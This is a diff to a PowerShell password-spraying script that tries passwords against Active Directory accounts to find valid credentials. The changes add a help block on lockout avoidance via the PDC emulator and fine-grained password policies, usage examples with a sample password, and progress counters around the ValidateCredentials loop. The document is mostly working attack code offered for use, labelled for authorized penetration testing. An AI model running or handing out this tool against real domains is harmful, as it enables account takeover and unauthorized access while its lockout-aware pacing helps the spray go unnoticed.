@@ -1,5 +1,41 @@
 #requires -version 2
+<#
+.SYNOPSIS
+    DomainPasswordSpray.ps1 — lockout-safe domain password spraying for
+    AUTHORIZED penetration-testing engagements only.
 
+    This is a safety-hardened reimplementation inspired by dafthack's
+    DomainPasswordSpray. The defining difference: every authentication attempt
+    is gated by a PDCe- and PSO-aware lockout check, so the tool cannot spend an
+    account's last attempts and lock it out.
+
+.WHY THE PDCe MATTERS
+    Account lockout state (badPwdCount) is authoritative ONLY on the PDC
+    emulator. The PDCe is contacted on every failed interactive/network logon,
+    but badPwdCount is NOT replicated to other DCs in real time. Reading it from
+    a random DC returns a stale value and can lock accounts you believed were
+    safe. This script always binds to the PDCe for policy and count reads.
+
+.WHY PSOs MATTER
+    Fine-grained password policies (PSOs) override the domain default lockout
+    threshold/window per user or group. A service account under a strict 3-try
+    PSO must be gated at 3, not the domain's 10. The effective policy is read
+    from the constructed attribute msDS-ResultantPSO.
+
+.USAGE
+    . .\DomainPasswordSpray.ps1
+    Invoke-DomainPasswordSpray -Password 'Autumn2025!' -SafetyMargin 2
+    Invoke-DomainPasswordSpray -PasswordList .\passwords.txt -UserList .\users.txt -OutFile hits.txt
+
+.NOTES
+    Authorized testing only. Confirm lockout policy and PSO scope with the client
+    before running. One attempt per user per round; wait out the observation
+    window between rounds.
+#>
+
+# ===========================================================================
+#  SAFETY LAYER  (PDCe + PSO aware lockout avoidance)
+# ===========================================================================
 
 function Get-PDCEmulator {
     # PDCe is the FSMO role holder authoritative for lockout state.
@@ -280,23 +316,38 @@ function Invoke-DomainPasswordSpray {
     $ctx  = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain', $Domain)
     $hits = New-Object System.Collections.ArrayList
 
+    $totalUsers = $users.Count
+    $attempted = 0   # live running totals across the whole spray
+    $skipped   = 0
+
     for ($i = 0; $i -lt $passwords.Count; $i++) {
         $pw = $passwords[$i]
         Write-Host ""
         Write-Host "[*] Round $($i+1)/$rounds  password='$pw'  $(Get-Date -Format HH:mm:ss)"
 
+        $idx = 0
         foreach ($u in $users) {
+            $idx++
+            $pct = [int](($idx / $totalUsers) * 100)
+            Write-Progress -Activity ("Spraying round {0}/{1}" -f ($i+1), $rounds) `
+                -Status ("[{0}/{1}] attempted={2} skipped={3} valid={4} | now: {5}" -f `
+                    $idx, $totalUsers, $attempted, $skipped, $hits.Count, $u) `
+                -PercentComplete $pct
+
             # SAFETY GATE — nothing authenticates unless this passes.
             if (-not (Test-SpraySafe -PDC $PDC -SamAccountName $u -DomainPolicy $DomainPolicy `
                         -SafetyMargin $SafetyMargin -SkipOnUnreadablePSO:$SkipOnUnreadablePSO)) {
+                $skipped++
                 continue
             }
 
             $valid = $false
             try {
                 $valid = $ctx.ValidateCredentials($u, $pw)
+                $attempted++
             } catch {
                 Write-Warning "[$u] validation error: $_"
+                $skipped++
                 continue
             }
 
@@ -308,6 +359,9 @@ function Invoke-DomainPasswordSpray {
             }
         }
 
+        Write-Progress -Activity ("Spraying round {0}/{1}" -f ($i+1), $rounds) -Completed
+        Write-Host ("[*] Round $($i+1) complete — attempted=$attempted skipped=$skipped valid=$($hits.Count)")
+
         # Wait out the window before the next password so badPwdCount decays.
         if ($i -lt ($passwords.Count - 1)) {
             Write-Host "[*] Sleeping $sleepSeconds s to clear observation window..."
@@ -316,7 +370,7 @@ function Invoke-DomainPasswordSpray {
     }
 
     Write-Host ""
-    Write-Host "[*] Done. $($hits.Count) valid credential(s)."
+    Write-Host "[*] Done. attempted=$attempted  skipped=$skipped  valid=$($hits.Count)"
     if ($OutFile) { Write-Host "[*] Results written to $OutFile" }
     return $hits
 }
